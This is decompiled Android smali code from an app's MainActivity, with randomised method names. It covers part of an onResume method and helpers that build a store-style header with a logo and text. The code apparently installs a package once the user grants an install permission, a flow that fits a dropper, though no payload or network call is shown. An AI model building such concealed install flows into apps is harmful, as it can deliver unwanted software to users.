    iget-object v0, p0, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr:Landroid/content/SharedPreferences;

    .line 161
    .line 162
    invoke-interface {v0, v6, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 163
    .line 164
    .line 165
    move-result-object v0

    .line 166
    if-eqz v0, :cond_5

    .line 167
    .line 168
    invoke-virtual {p0, v0}, Lio/bluewave/app/MainActivity;->EQ6go6jAtySCouhWhLsA(Ljava/lang/String;)Z

    .line 169
    .line 170
    .line 171
    move-result v0

    .line 172
    if-eqz v0, :cond_5

    .line 173
    .line 174
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    .line 175
    .line 176
    .line 177
    return-void

    .line 178
    :cond_2
    iget-boolean v1, p0, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs:Z

    .line 179
    .line 180
    if-eqz v1, :cond_4

    .line 181
    .line 182
    iput-boolean v4, p0, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs:Z

    .line 183
    .line 184
    iget-object v1, p0, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr:Landroid/content/SharedPreferences;

    .line 185
    .line 186
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 187
    .line 188
    .line 189
    move-result-object v1

    .line 190
    const-string v4, "pending_install"

    .line 191
    .line 192
    invoke-interface {v1, v4}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 193
    .line 194
    .line 195
    move-result-object v1

    .line 196
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 197
    .line 198
    .line 199
    if-eqz v0, :cond_3

    .line 200
    .line 201
    const-string v0, "onResume: permission granted, going to page 2 and installing"

    .line 202
    .line 203
    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 204
    .line 205
    .line 206
    iget-object v0, p0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 207
    .line 208
    invoke-virtual {v0, v3}, Landroid/widget/ViewAnimator;->setDisplayedChild(I)V

    .line 209
    .line 210
    .line 211
    invoke-virtual {p0}, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr()V

    .line 212
    .line 213
    .line 214
    return-void

    .line 215
    :cond_3
    const-string v0, "onResume: permission NOT granted, going to page 3"

    .line 216
    .line 217
    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 218
    .line 219
    .line 220
    iget-object v0, p0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 221
    .line 222
    const/4 v1, 0x2

    .line 223
    invoke-virtual {v0, v1}, Landroid/widget/ViewAnimator;->setDisplayedChild(I)V

    .line 224
    .line 225
    .line 226
    return-void

    .line 227
    :cond_4
    iget-boolean v0, p0, Lio/bluewave/app/MainActivity;->UgIxXQ6S7mmUt2naV:Z

    .line 228
    .line 229
    if-eqz v0, :cond_5

    .line 230
    .line 231
    iput-boolean v4, p0, Lio/bluewave/app/MainActivity;->UgIxXQ6S7mmUt2naV:Z

    .line 232
    .line 233
    :cond_5
    return-void
.end method

.method public final vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;
    .locals 2

    .line 1
    new-instance v0, Landroid/widget/LinearLayout;

    .line 2
    .line 3
    invoke-direct {v0, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 4
    .line 5
    .line 6
    const/4 v1, 0x0

    .line 7
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 8
    .line 9
    .line 10
    return-object v0
.end method

.method public final vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;
    .locals 1

    .line 1
    new-instance v0, Landroid/widget/TextView;

    .line 2
    .line 3
    invoke-direct {v0, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 4
    .line 5
    .line 6
    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 7
    .line 8
    .line 9
    const/4 p1, 0x2

    .line 10
    int-to-float p2, p2

    .line 11
    invoke-virtual {v0, p1, p2}, Landroid/widget/TextView;->setTextSize(IF)V

    .line 12
    .line 13
    .line 14
    invoke-virtual {v0, p3}, Landroid/widget/TextView;->setTextColor(I)V

    .line 15
    .line 16
    .line 17
    const/4 p1, 0x0

    .line 18
    if-eqz p4, :cond_0

    .line 19
    .line 20
    const-string p2, "sans-serif-medium"

    .line 21
    .line 22
    invoke-static {p2, p1}, Landroid/graphics/Typeface;->create(Ljava/lang/String;I)Landroid/graphics/Typeface;

    .line 23
    .line 24
    .line 25
    move-result-object p1

    .line 26
    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 27
    .line 28
    .line 29
    return-object v0

    .line 30
    :cond_0
    const-string p2, "sans-serif"

    .line 31
    .line 32
    invoke-static {p2, p1}, Landroid/graphics/Typeface;->create(Ljava/lang/String;I)Landroid/graphics/Typeface;

    .line 33
    .line 34
    .line 35
    move-result-object p1

    .line 36
    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 37
    .line 38
    .line 39
    return-object v0
.end method

.method public final vpNdwwpwBwplN()Landroid/widget/LinearLayout;
    .locals 6

    .line 1
    invoke-virtual {p0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    const/16 v1, 0x10

    .line 6
    .line 7
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 8
    .line 9
    .line 10
    const/4 v1, -0x1

    .line 11
    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundColor(I)V

    .line 12
    .line 13
    .line 14
    const/16 v1, 0xe

    .line 15
    .line 16
    invoke-virtual {p0, v1}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 17
    .line 18
    .line 19
    move-result v2

    .line 20
    const/16 v3, 0xc

    .line 21
    .line 22
    invoke-virtual {p0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 23
    .line 24
    .line 25
    move-result v4

    .line 26
    invoke-virtual {p0, v1}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 27
    .line 28
    .line 29
    move-result v1

    .line 30
    invoke-virtual {p0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 31
    .line 32
    .line 33
    move-result v3

    .line 34
    invoke-virtual {v0, v2, v4, v1, v3}, Landroid/view/View;->setPadding(IIII)V

    .line 35
    .line 36
    .line 37
    new-instance v1, Landroid/widget/ImageView;

    .line 38
    .line 39
    invoke-direct {v1, p0}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    .line 40
    .line 41
    .line 42
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    .line 43
    .line 44
    .line 45
    move-result-object v2

    .line 46
    const-string v3, "drawable"

    .line 47
    .line 48
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 49
    .line 50
    .line 51
    move-result-object v4

    .line 52
    const-string v5, "store_logo_custom"

    .line 53
    .line 54
    invoke-virtual {v2, v5, v3, v4}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    .line 55
    .line 56
    .line 57
    move-result v2

    .line 58
    if-eqz v2, :cond_0

    .line 59
    .line 60
    invoke-virtual {v1, v2}, Landroid/widget/ImageView;->setImageResource(I)V

    .line 61
    .line 62
    .line 63
    goto :goto_0

    .line 64
    :cond_0
    const v2, 0x7f070098

    .line 65
    .line 66
    .line 67
    :try_start_0
    invoke-virtual {p0, v2}, Landroid/content/Context;->getDrawable(I)Landroid/graphics/drawable/Drawable;

    .line 68
    .line 69
    .line 70
    move-result-object v2

    .line 71
    invoke-virtual {v1, v2}, Landroid/widget/ImageView;->setImageDrawable(Landroid/graphics/drawable/Drawable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 72
    .line 73
    .line 74
    :catch_0
    :goto_0
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    .line 75
    .line 76
    const/16 v3, 0x18

    .line 77
    .line 78
    invoke-virtual {p0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 79
    .line 80
    .line 81
    move-result v4

    .line 82
    invoke-virtual {p0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 83
    .line 84
    .line 85
    move-result v3

    .line 86
    invoke-direct {v2, v4, v3}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 87
    .line 88
    .line 89
    const/16 v3, 0x8

    .line 90
    .line 91
    invoke-virtual {p0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 92
    .line 93
    .line 94
    move-result v3

    .line 95
    iput v3, v2, Landroid/widget/LinearLayout$LayoutParams;->rightMargin:I

    .line 96
    .line 97
    invoke-virtual {v0, v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 98
    .line 99
    .line 100
    const v1, 0x7f0f0100

    .line 101
    .line 102
    .line 103
    invoke-virtual {p0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 104
    .line 105
    .line 106
    move-result-object v1

    .line 107
    iget v2, p0, Lio/bluewave/app/MainActivity;->YnQspRyi16s9vN5:I

    .line 108
    .line 109
    const/4 v3, 0x0

    .line 110
    const/16 v4, 0x14

    .line 111
    .line 112
    invoke-virtual {p0, v1, v4, v2, v3}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 113
    .line 114
    .line 115
    move-result-object v1

    .line 116
    invoke-virtual {v0, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 117
    .line 118
    .line 119
    return-object v0
.end method
